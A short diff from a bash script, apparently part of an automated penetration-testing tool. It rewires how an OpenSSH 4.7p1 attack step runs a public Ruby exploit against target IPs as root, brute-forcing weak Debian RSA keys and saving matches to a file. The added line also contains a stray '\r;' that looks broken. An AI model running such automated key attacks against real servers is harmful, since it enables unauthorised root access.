@@ -326,17 +326,7 @@ function OpenSSH4_7p1(){
 		tar -C $dir_path/exploits/ssh/ -xjf $dir_path/exploits/ssh/5622.tar.bz2
 		sleep 30
 	fi
-	if [ "$key" != "" ]
-	then
-		if [ "$terminal" = "gnome" ]
-		then
-			gnome-terminal -e "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; sleep 1\r; bash'" 2> /dev/null
-			sleep 10
-		else
-			tmux new-window -n keysAttack "bash -c 'ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; sleep 1 \r; read; bash'" \; 2> /dev/null
-			sleep 10
-		fi
-	fi
+	ruby $dir_path/exploits/ssh/5632 $ips root $dir_path/exploits/ssh/rsa/2048 > $ips/keys.txt; \r;
 	sleep 20
 	grep -v -e 'testing' -e 'KEYFILE' $ips/keys.txt > $ips/key.txt
 	sleep 2
